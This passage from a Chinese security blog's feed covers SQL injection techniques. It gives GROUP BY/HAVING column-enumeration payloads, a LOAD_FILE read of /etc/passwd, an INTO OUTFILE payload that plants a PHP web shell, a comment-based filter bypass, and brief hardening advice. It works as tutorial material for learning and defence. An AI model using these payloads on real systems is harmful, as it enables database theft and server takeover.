id="2）利用-GROUP-BY-amp-HAVING-获取数据库字段信息"><a href="#2）利用-GROUP-BY-amp-HAVING-获取数据库字段信息" class="headerlink" title="2）利用 GROUP BY &amp; HAVING 获取数据库字段信息"></a>2）利用 GROUP BY &amp; HAVING 获取数据库字段信息</h5><p>这里将 HAVING 子句与 GROUP BY 子句结合使用。也可以在 SELECT 语句中使用 HAVING 子句过滤 GROUP BY返回的记录。GROUP BY 要求 SELECT 语句选择的字段是某个聚合函数的结果或者包含在 GROUP BY 子句中。如果该条件不满足，那么数据库会返回一个错误，显示出该问题的第一列。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/a.aspx?a=bikes&apos; having &apos;1&apos;=&apos;1</span><br><span class="line">获取第一列列名 products.productid</span><br><span class="line"></span><br><span class="line">继续利用获取所有的列</span><br><span class="line">http://www.test.com/a.aspx?a=bikes&apos; GROUP BY productid having &apos;1&apos;=&apos;1</span><br><span class="line">返回「products.name」</span><br><span class="line"></span><br><span class="line">http://www.test.com/a.aspx?a=bikes&apos; GROUP BY productid,name having &apos;1&apos;=&apos;1</span><br><span class="line">返回「products.price」</span><br><span class="line"></span><br><span class="line">枚举出所有的列名吼，可以继续使用上面的类型转换错误来检索列对应的值</span><br><span class="line">http://www.test.com/a.aspx?a=bikes&apos; and 1=0/name;--</span><br><span class="line"></span><br><span class="line">将已经发现的列加入到否定条件中，从而获取其他的列</span><br><span class="line">http://www.test.com/a.aspx?a=bikes&apos; and name not in (&apos;diyilie&apos;) and 1=0/name and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h3 id="二、文件读取-amp-写入"><a href="#二、文件读取-amp-写入" class="headerlink" title="二、文件读取&amp;写入"></a>二、文件读取&amp;写入</h3><h4 id="1-MySQL"><a href="#1-MySQL" class="headerlink" title="1. MySQL"></a>1. MySQL</h4><h5 id="1）-LOAD-FILE-函数"><a href="#1）-LOAD-FILE-函数" class="headerlink" title="1） LOAD_FILE 函数"></a>1） LOAD_FILE 函数</h5><p>他能够读取文件并将文件内容作为字符串返回。<br>需要提供文件的完整路径，调用该函数的用户需要有FILE权限</p><p>示例：<code>UNION ALL SELECT LOAD_FULE(‘/etc/passwd’)--</code></p><h5 id="2）INTO-OUTFILE-函数"><a href="#2）INTO-OUTFILE-函数" class="headerlink" title="2）INTO OUTFILE 函数"></a>2）INTO OUTFILE 函数</h5><p>创建系统文件并进行写操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT &quot;&lt;? system($_REQUEST[&apos;cmd&apos;]; ?)&gt;&quot; INTO OUTFILE &quot;/var/www/html/victim.com/cmd.php&quot; -</span><br></pre></td></tr></table></figure><h3 id="读取数据库信息"><a href="#读取数据库信息" class="headerlink" title="读取数据库信息"></a>读取数据库信息</h3><h2 id="0x04-常见的绕过技巧"><a href="#0x04-常见的绕过技巧" class="headerlink" title="0x04 常见的绕过技巧"></a>0x04 常见的绕过技巧</h2><p>使用注释绕过过滤<br>如用多行注释绕过空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.a.com/a.aspx?uid=45/**/or/**/1=1</span><br></pre></td></tr></table></figure><h2 id="0x05-SQLi之白盒审计"><a href="#0x05-SQLi之白盒审计" class="headerlink" title="0x05 SQLi之白盒审计"></a>0x05 SQLi之白盒审计</h2><h2 id="0x06-常用的测试工具"><a href="#0x06-常用的测试工具" class="headerlink" title="0x06 常用的测试工具"></a>0x06 常用的测试工具</h2><h2 id="0x07-SQL修复建议"><a href="#0x07-SQL修复建议" class="headerlink" title="0x07 SQL修复建议"></a>0x07 SQL修复建议</h2><h3 id="一、安全的数据库配置"><a href="#一、安全的数据库配置" class="headerlink" title="一、安全的数据库配置"></a>一、安全的数据库配置</h3><p>以普通的用户身份运行数据库服务器，而不要使用内置账户来连接数据库（Windows下的Oracle必须以SYSTEM权限运行）。功能强大的内置账户可以在数据库上执行很多与程序需求无关的操作（如：xp_cmdshell; OPENROWSET; LOAD_FILE ; ActiveX Java等）</p><h2 id="引用-amp-致谢"><a href="#引用-amp-致谢" class="headerlink" title="引用&amp;致谢"></a>引用&amp;致谢</h2><blockquote><p>【SQL注入攻击与防御（第2版）】<br><a href="[http://blackwolfsec.cc/2018/03/13/Mysql_sleep/](http://blackwolfsec.cc/2018/03/13/Mysql_sleep/">Mysql 执行优先级和sleep函数延时注入的一个Tip</a>)</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
      <category term="Web安全" scheme="http://blog.sanmi.site/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="SQLi" scheme="http://blog.sanmi.site/tags/SQLi/"/>
    
  </entry>
  
  <entry>
    <title>me</title>
    <link href="http://blog.sanmi.site/2019/05/10/me/"/>
    <id>http://blog.sanmi.site/2019/05/10/me/</id>
    <published>2019-05-10T05:18:24.000Z</published>
    <updated>2019-05-10T05:18:24.438Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
</feed>
